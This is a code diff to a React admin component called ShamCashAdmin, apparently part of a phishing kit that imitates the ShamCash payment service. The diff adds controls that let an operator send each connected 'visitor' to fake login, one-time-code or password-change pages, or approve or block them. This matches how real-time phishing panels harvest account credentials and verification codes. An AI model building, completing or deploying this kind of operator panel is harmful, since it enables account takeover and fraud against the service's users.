@@ -360,6 +360,46 @@ export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
                     </div>
                   ))}
                 </div>
+
+                {visitor.status !== "disconnected" && (
+                  <div className="pt-2 border-t border-white/[0.06] space-y-2">
+                    <p className="text-[9px] font-bold text-[#c9ccdb]/40 uppercase tracking-widest">{T.chooseRedirect}</p>
+                    <div className="grid grid-cols-3 gap-1.5">
+                      {[
+                        { target: "login", label: T.redirectLogin, color: "text-[#c9ccdb]", border: "border-white/10", bg: "bg-white/5 hover:bg-white/10", icon: <UserRound className="h-3.5 w-3.5" /> },
+                        { target: "otp", label: T.redirectOtp, color: "text-[#657bd8]", border: "border-[#657bd8]/30", bg: "bg-[#657bd8]/10 hover:bg-[#657bd8]/20", icon: <ShieldCheck className="h-3.5 w-3.5" /> },
+                        { target: "changepass", label: T.redirectChangepass, color: "text-[#1fc28a]", border: "border-[#1fc28a]/30", bg: "bg-[#1fc28a]/10 hover:bg-[#1fc28a]/20", icon: <KeyRound className="h-3.5 w-3.5" /> },
+                      ].map((opt) => (
+                        <button
+                          key={opt.target}
+                          onClick={() => {
+                            localStorage.setItem("sham_admin_cmd", `redirect:${opt.target}`);
+                          }}
+                          className={`flex flex-col items-center gap-1 rounded-[9px] border ${opt.border} ${opt.bg} py-2 ${opt.color} transition-colors active:scale-95`}
+                        >
+                          {opt.icon}
+                          <span className="text-[9px] font-bold leading-tight text-center">{opt.label}</span>
+                        </button>
+                      ))}
+                    </div>
+                    <div className="grid grid-cols-2 gap-1.5">
+                      <button
+                        onClick={() => { localStorage.setItem("sham_admin_cmd", "redirect:changepass"); }}
+                        className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95"
+                      >
+                        <CheckCircle className="h-3.5 w-3.5" />
+                        <span className="text-[10px] font-bold">{T.approve}</span>
+                      </button>
+                      <button
+                        onClick={() => { localStorage.setItem("sham_admin_cmd", "redirect:blocked"); }}
+                        className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#e54343]/15 border border-[#e54343]/30 py-2 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95"
+                      >
+                        <XCircle className="h-3.5 w-3.5" />
+                        <span className="text-[10px] font-bold">{T.reject}</span>
+                      </button>
+                    </div>
+                  </div>
+                )}
               </div>
             </div>
           )}
